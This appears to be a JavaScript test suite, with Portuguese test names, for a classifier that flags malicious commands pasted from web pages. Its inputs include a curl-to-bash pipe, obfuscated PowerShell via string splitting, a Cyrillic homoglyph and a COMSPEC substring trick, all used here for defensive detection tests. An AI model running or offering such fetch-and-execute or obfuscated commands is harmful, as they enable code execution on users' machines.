import test from "node:test";
import assert from "node:assert/strict";
import { classify } from "../src/classifier.js";
import { benign, maliciousSimulated } from "./fixtures.js";

test("classifica todos os exemplos simulados como ao menos low", () => {
  const results = maliciousSimulated.map((text) => classify(text));
  assert.ok(results.every((result) => result.level === "low" || result.level === "high"));
  const high = results.filter((result) => result.level === "high").length;
  assert.ok(high > results.length / 2, `${high}/${results.length} devem ser high`);
});

test("comandos e textos benignos da documentação não geram alertas", () => {
  const results = benign.map((text) => classify(text));
  assert.ok(results.every((result) => result.level === "none"));
});

test("limita textos menores que 20 caracteres a no máximo low", () => {
  for (const value of ["mshta x", "cmd /c echo x", "bash -c x"]) {
    assert.notEqual(classify(value).level, "high", value);
  }
});

test("contexto apenas aumenta score e não cria detecção sozinho", () => {
  const text = "texto completamente comum";
  const plain = classify(text);
  const contextual = classify(text, {
    fullscreen: true,
    crossOriginIframe: true,
    msSinceClick: 100
  });
  assert.equal(plain.level, "none");
  assert.equal(contextual.level, "none");
  assert.equal(contextual.score, plain.score);

  const command = "cmd /c echo test && calc";
  const withoutContext = classify(command);
  const withContext = classify(command, {
    fullscreen: true,
    crossOriginIframe: true,
    msSinceClick: 100
  });
  assert.ok(withContext.score > withoutContext.score);
});

test("retorna razões legíveis e trata entradas inválidas como texto vazio", () => {
  const result = classify("curl https://example.invalid | bash");
  assert.ok(result.reasons.includes("curl/wget para shell"));
  assert.ok(result.reasons.includes("encadeamento |"));
  assert.deepEqual(classify(null), { score: 0, level: "none", reasons: [] });
});

test("evita alertas de documentação e reduz pipes de instaladores ambíguos", () => {
  assert.equal(classify("https://docs.example.com/powershell/").level, "none");
  assert.equal(classify("curl -fsSL https://get.example.invalid/install | sh").level, "low");
});

test("reconhece concatenação, homógrafos, comandos multilinha e COMSPEC sem alertar texto comum", () => {
  for (const text of [
    "'po'+'wer'+'shell' -Command 'echo ok'",
    "p\u043ewershell -Command 'echo ok'",
    "powershell\n.exe -Command 'echo ok'",
    "%COMSPEC:~-7,3% /c echo calc"
  ]) {
    assert.notEqual(classify(text).level, "none", text);
  }
  assert.equal(classify("Русский текст о консоли в документации").level, "none");
});

test("classifica apenas as extremidades de textos acima de 100 KiB", () => {
  const size = 120 * 1024;
  const middleOnly = `${"ordinary text ".repeat(4400)}cmd /c echo test${" ordinary text".repeat(4400)}`;
  assert.ok(middleOnly.length > size);
  assert.equal(classify(middleOnly).level, "none");

  const tail = `${"ordinary text ".repeat(4400)}${" ordinary text".repeat(4400)} cmd /c echo test`;
  assert.ok(tail.length > size);
  assert.notEqual(classify(tail).level, "none");
});

test("imprime taxas de falsos positivos e falsos negativos", () => {
  const falsePositives = benign.filter((text) => classify(text).level !== "none").length;
  const falseNegatives = maliciousSimulated.filter((text) => classify(text).level === "none").length;
  const fpRate = (falsePositives / benign.length) * 100;
  const fnRate = (falseNegatives / maliciousSimulated.length) * 100;
  console.log(`Taxa de falsos positivos: ${fpRate.toFixed(1)}% (${falsePositives}/${benign.length})`);
  console.log(`Taxa de falsos negativos: ${fnRate.toFixed(1)}% (${falseNegatives}/${maliciousSimulated.length})`);
  assert.equal(falsePositives, 0);
  assert.equal(falseNegatives, 0);
});
